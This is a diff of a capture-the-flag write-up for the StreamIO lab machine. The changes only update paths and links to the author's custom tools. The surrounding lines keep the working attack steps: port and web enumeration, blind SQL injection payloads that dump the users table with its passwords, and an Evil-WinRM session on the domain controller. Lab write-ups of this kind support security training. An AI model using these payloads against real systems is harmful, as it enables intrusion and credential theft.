@@ -22,10 +22,10 @@ StreamIO is a medium machine where subdomain enumeration leads to an SQL injecti
 Start with port scanning
 
 ```bash
-python ../../sectools/portscan.py --target <TARGET_IP>
+python portscan.py --target <TARGET_IP>
 ```
 
-This is a [custom tool](https://github.com/n-califano/sectools/blob/main/portscan.py). If you want to run standard commands run
+This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py). If you want to run standard commands run
 
 ```bash
 nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
@@ -122,10 +122,10 @@ Now you should be able to browse to both https://streamIO.htb and https://watch.
 Run subdirectory enumeration
 
 ```bash
-python ../../sectools/webenum.py -t https://streamio.htb/ --web
+python webenum.py -t https://streamio.htb/ --web
 ```
 
-This is a [custom tool](https://github.com/n-califano/sectools/blob/main/webenum.py). If you want to run standard commands refer to the ffuf commands in the output below
+This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/webenum.py). If you want to run standard commands refer to the ffuf commands in the output below
 
 ```bash
 [*] Target : https://streamio.htb
@@ -174,7 +174,7 @@ Unfortunately, it requires authentication and it's not accessible for now.
 Run enumeration against it to check if it has accessible subpages.
 
 ```bash
-python ../../sectools/webenum.py -t https://streamio.htb/admin --web --extensions php
+python webenum.py -t https://streamio.htb/admin --web --extensions php
 
 [*] Target : https://streamio.htb/admin
 [*] Mode : web
@@ -222,7 +222,7 @@ This suggests this page is supposed to be included in another page somehow.
 Continue enumeration with the watch.streamio.htb subdomain
 
 ```bash
-python ../../sectools/webenum.py -t https://watch.streamio.htb --web --extensions php,asp,aspx
+python webenum.py -t https://watch.streamio.htb --web --extensions php,asp,aspx
 
 [*] Target : https://watch.streamio.htb
 [*] Mode : web
@@ -303,12 +303,12 @@ Assume you want to know the db name. What you do is basically this:
 
 and based on the true/false responses you determine if you guessed the correct char. When you get 'true' you move to the next char and you keep going until you guess all chars.
 
-This is unfeasible manually (would probably require days) so you can use the following [custom tool](https://github.com/n-califano/sectools/blob/main/blind_sql_extractor.py) (or any other you like).
+This is unfeasible manually (would probably require days) so you can use the following [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/blind_sql_extractor.py) (or any other you like).
 
 Find db name
 
 ```bash
-python ../../sectools/blind_sql_extractor.py -q "DB_NAME()" -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy
+python blind_sql_extractor.py -q "DB_NAME()" -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy
 DB_NAME(): STREAMIO
 ```
 
@@ -317,7 +317,7 @@ The script is very slow but does its job. Run it with the '-h' flag to understan
 Found a db named **STREAMIO**, enumerate its tables
 
 ```bash
-python ../../sectools/blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-tables
+python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-tables
 Found table: movies
 Found table: users
 
@@ -327,7 +327,7 @@ All tables: ['movies', 'users']
 Focus on 'users' table, extract its columns
 
 ```bash
-python ../../sectools/blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-columns -t users
+python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-columns -t users
 Found column: id
 Found column: username
 Found column: password
@@ -341,7 +341,7 @@ Knowing the columns you can dump the table.
 Warning: the next command will be **very slow**, like "a couple of hours" slow. Go watch a movie or something.
 
 ```bash
-python ../../sectools/blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --dump-table -t users -c id,username,password,is_staff
+python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --dump-table -t users -c id,username,password,is_staff
 Found 30 rows in users
 Column id: int
 Column username: nchar
@@ -484,7 +484,7 @@ Re-run enumeration on the /admin route. Make sure to pass your cookie, since the
 Warning: the cookie expires after a while, so you may need to login again if too much time has passed after the last login.
 
 ```bash
-python ../../sectools/webenum.py -t https://streamio.htb/admin --web --extensions php,asp,aspx --headers "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c" --param-discovery
+python webenum.py -t https://streamio.htb/admin --web --extensions php,asp,aspx --headers "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c" --param-discovery
 [*] Target : https://streamio.htb/admin
 [*] Mode : web param-discovery
 [*] Size   : web=small api=small vhost=small
@@ -848,7 +848,7 @@ Notice that the password for the JDgodd system user is different from the one in
 
 Enumerate the ACL of the DC object
 
-The following commands use a [custom module](https://github.com/n-califano/sectools/blob/main/PSHelpers.psm1)
+The following commands use a [custom module](https://github.com/n-califano/sectools/blob/main/tools/windows/PSHelpers.psm1)
 
 ```powershell
 *Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PSHelpers.psm1
